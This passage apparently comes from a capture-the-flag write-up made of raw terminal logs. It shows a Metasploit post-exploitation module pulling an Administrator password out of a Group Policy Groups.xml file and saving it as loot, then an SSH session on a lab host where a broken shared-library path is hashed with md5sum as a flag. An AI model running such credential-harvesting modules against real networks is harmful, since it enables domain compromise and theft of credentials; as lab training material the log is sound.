[*] [2020.06.06-22:09:11] Searching for Policy Share on DC...
[-] [2020.06.06-22:09:11] Error accessing \\DC\SYSVOL : stdapi_fs_ls: Operation failed: 1265
[*] [2020.06.06-22:09:11] Searching for Policy Share on DC.HACKING.HAUS...
[-] [2020.06.06-22:09:11] Error accessing \\DC.HACKING.HAUS\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.
[*] [2020.06.06-22:09:11] Enumerating DCs for DC on the network...
[-] [2020.06.06-22:09:35] ERROR_NO_BROWSER_SERVERS_FOUND
[-] [2020.06.06-22:09:35] No Domain Controllers found for DC
[*] [2020.06.06-22:09:35] Searching for Policy Share on DC.HACKING.HAUS...
[-] [2020.06.06-22:09:35] Error accessing \\DC.HACKING.HAUS\SYSVOL : stdapi_fs_ls: Operation failed: The network path was not found.
[*] [2020.06.06-22:09:35] Searching for Group Policy XML Files...
[*] [2020.06.06-22:09:36] Parsing file: C:\ProgramData\Microsoft\Group Policy\History\{A1C0C41B-D2F8-401B-A5D1-437DA197A809}\MACHINE\Preferences\Groups\Groups.xml ...
[+] [2020.06.06-22:09:36] Group Policy Credential Info
============================

 Name               Value
 ----               -----
 TYPE               Groups.xml
 USERNAME           Administrator
 PASSWORD           A11Y0ur8@53Rb3l0ng2u5
 DOMAIN CONTROLLER  Microsoft
 DOMAIN             History
 CHANGED            2018-07-29 14:52:19
 NEVER_EXPIRES?     0
 DISABLED           0

[+] [2020.06.06-22:09:36] XML file saved to: /root/.msf4/loot/20200606220936_default_192.168.1.100_windows.gpp.xml_223890.txt

[*] [2020.06.06-22:09:37] Parsing file: C:\ProgramData\Microsoft\Group Policy\History\{BBA428CF-DE21-4BEB-82D7-8C07D6DA346C}\MACHINE\Preferences\Groups\Groups.xml ...
[*] Post module execution completed
msf post(windows/gather/credentials/gpp) >
```

# fencedtourist

```shell-session
╭─zoey@nomadic ~
╰─$ ssh user@172.30.64.187
The authenticity of host '172.30.64.187 (172.30.64.187)' can't be established.
ECDSA key fingerprint is SHA256:6eiKO/d2zmsAJljKsyF7y8pMr+bbaZ39nGtfbDu+3Z4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.30.64.187' (ECDSA) to the list of known hosts.
no such identity: /home/zoey/.ssh/keys/user@172.30.64.187: No such file or directory
user@172.30.64.187's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jun  7 05:22:49 UTC 2020

  System load:  0.59               Processes:             178
  Usage of /:   10.2% of 62.74GB   Users logged in:       0
  Memory usage: 4%                 IP address for ens160: 172.30.64.187
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Tue Aug 13 15:42:36 2019
user@ubuntu18:~$ ls /tmp
ls: error while loading shared libraries: /usr/src/linux-headers-4.15.0-36/include/linux/extcon/brltty: cannot open shared object file: No such file or directory
user@ubuntu18:~$ cd /tmp
user@ubuntu18:/tmp$ ls -la
ls: error while loading shared libraries: /usr/src/linux-headers-4.15.0-36/include/linux/extcon/brltty: cannot open shared object file: No such file or directory
user@ubuntu18:/tmp$ echo -n '/usr/src/linux-headers-4.15.0-36/include/linux/extcon/brltty' | md5sum
b60ee4af4c09edaa10311f8ca2c57497  -
user@ubuntu18:/tmp$
```

# indyblare
